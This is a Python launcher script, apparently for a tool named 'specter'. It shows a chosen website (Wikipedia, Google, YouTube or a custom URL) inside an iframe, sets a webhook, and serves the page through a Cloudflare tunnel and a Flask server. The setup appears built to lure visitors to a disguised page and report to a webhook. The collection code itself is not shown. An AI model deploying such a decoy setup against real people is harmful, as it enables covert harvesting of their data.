#!/usr/bin/env python3
import os
import sys
import threading
import logging
from utils import get_file_data, update_webhook, check_and_get_webhook_url
from port_forward import run_tunnel, shutdown_flag, run_flask, args, get_file_data, is_port_available

# Set up logging
log_file = "specter.log"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

if sys.stdout.isatty():
    R = '\033[31m'  # Red
    G = '\033[32m'  # Green
    C = '\033[36m'  # Cyan
    W = '\033[0m'   # Reset
    Y = '\033[33m'  # Yellow
    M = '\033[35m'  # Magenta
    B = '\033[34m'  # Blue
else:
    R = G = C = W = Y = M = B = ''


def main():
    # Ask which website to open
    print(f"\n{B}[+] {C}Which website would you like to display in the iframe?{W}")
    print(f"{Y}1. Wikipedia (default){W}")
    print(f"{Y}2. Google{W}")
    print(f"{Y}3. YouTube{W}")
    print(f"{Y}4. Custom URL{W}")
    website_choice = input(f"\n{B}[+] {Y}Enter your choice (1-4, default is 1): {W}").strip() or "1"

    website_url = "https://www.wikipedia.org"
    if website_choice == "1":
        website_url = "https://www.wikipedia.org"
    elif website_choice == "2":
        website_url = "https://www.google.com"
    elif website_choice == "3":
        website_url = "https://www.youtube.com"
    elif website_choice == "4":
        website_url = input(f"\n{B}[+] {C}Enter custom URL (e.g., https://example.com): {W}").strip()

    # Save website URL to file
    website_url_file = "all/website_url.txt"
    with open(website_url_file, 'w') as f:
        f.write(website_url)
    print(f"{G}[+] Website URL saved: {W}{website_url}\n")

    log_file_path = os.path.abspath(log_file)
    print(f"{B}[+] {Y}Logs :{W} {log_file_path}\n")

     # Check if port is available
    if not is_port_available(args.port):
        print(f"{B}[?] {Y}Port : {W} {args.port} is already in use.{R} Please select another port.", "error")
        sys.exit(1)

    #print(f"{B}[!] {Y}Port : {W} {args.port} {G} is available.{W}")
    print(f'____________________________________________________________________________\n')
    
    folder_name = 'all'

    check_and_get_webhook_url(folder_name)

    # Start Cloudflare tunnel
    print(f'{B}[+] {C}Starting Cloudflare tunnel...{W}\n')
    threading.Thread(target=run_tunnel, daemon=True).start()

    # Start Flask server
    start_message = f"{G}[+] {C}Flask server started! Running on {W}http://127.0.0.1:{args.port}/{W}"
    print(f"\n{start_message}\n")
    logging.info(start_message)

    run_flask(folder_name)

if __name__ == "__main__":
    main()
